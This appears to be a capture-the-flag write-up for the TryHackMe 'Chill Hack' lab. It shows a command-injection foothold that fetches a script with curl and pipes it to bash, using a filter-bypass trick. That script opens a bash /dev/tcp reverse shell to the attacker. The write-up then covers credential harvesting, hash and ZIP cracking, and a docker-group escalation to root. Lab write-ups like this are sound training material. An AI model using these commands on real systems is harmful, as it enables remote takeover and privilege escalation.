# 🛡️ Chill Hack – CTF Writeup
![Author](https://img.shields.io/badge/Author-Jull3Hax0r-blue?style=flat-square&logo=github)
[![TryHackMe Room](https://img.shields.io/badge/TryHackMe-Chill%20Hack-success?style=flat-square&logo=tryhackme)](https://tryhackme.com/room/chillhack)
# TryHackMe-ChillHack
WriteUp for CTF "ChillHack" at TryHackMe


---

## 🔍 Initial Enumeration

Using `gobuster`, I discovered the `/secret/` endpoint:

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50
```

The `/secret/` path contains a user input field that executes system commands.

---

## ⚙️ Command Injection → Reverse Shell

After experimenting with filtered injection, I hosted a reverse shell script and used `curl` to execute it from the target.

### `shell.sh`:
```bash
bash -c "bash -i >& /dev/tcp/<IP>/443 0>&1"
```

### Listener & HTTP Server:
```bash
python3 -m http.server 8090
nc -lnvp 443
```

### Payload submitted:
```bash
curl http://<IP>:8090/shell.sh | ba\sh
```

✅ Reverse shell received as `www-data`.

---

## 🧑‍💻 Escalation to `apaar`

Discovered `/home/apaar`

```bash
sudo -l
```

Allowed command:

```bash
sudo -u apaar /home/apaar/.helpline.sh
```

Prompted with:
```
Welcome to helpdesk. Feel free to talk to anyone at any time!
```

Input:
```bash
/bin/sh
/bin/sh
id
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

✅ Escalated to user `apaar`

```bash
cat local.txt
{USER-FLAG: •••••••••••••••••••••••••••••••••••••}
```

---

## 🧬 Web Portal – MySQL Credentials

Found in `/var/www/files/index.php`:

```php
$con = new PDO("mysql:dbname=webportal;host=localhost","root","•••••••••••••••");
```

### Logged into MySQL:
```bash
mysql -u root -p
# password: ••••••••••••••••
```

Extracted users table → cracked two hashes:

- `Aurick`: `••••••••••••`
- `cullapaar`: `••••••••••••••••••`

(No escalation via these accounts.)

---

## 🖼️ Hidden Data in Image File

Found `/var/www/files/hacker.php` with the message:
> **"Look in the dark! You will find your answer"**

Referenced image: `/imges/hacker-with-laptop_23-2147985341.jpg`

Extracted:
```bash
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```

Got `backup.zip` (password protected)

### Cracked ZIP:
```bash
zip2john backup.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
john --show hash
```

✅ Password: `••••••••`

Inside: `source_code.php`

---

## 🔐 Escalation to `anurodh`

Found Base64-encoded credentials in `source_code.php`, decoded to:

- User: `anurodh`
- Password: `••••••••••••••••••••••••••`

### Switched to `anurodh`

Checked groups:

```bash
id
# ... groups=1002(anurodh),999(docker)
```

---

## 🚀 Root via Docker Group

Used GTFOBins Docker technique:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

✅ Root shell acquired:

```bash
whoami
# root

cat /root/proof.txt
{ROOT-FLAG: •••••••••••••••••••••••••••••••••••••}
```

---

## ✅ Summary

| Stage             | Result                                  |
|------------------|------------------------------------------|
| Initial Foothold | `www-data` via command injection         |
| User Escalation  | `apaar` via `.helpline.sh`               |
| Info Disclosure  | MySQL creds, user password hashes        |
| Escalation       | `anurodh` via hidden ZIP + base64 creds |
| Final            | `root` via Docker group abuse            |

---

🎯 *Box rooted. See you in `/root`!*
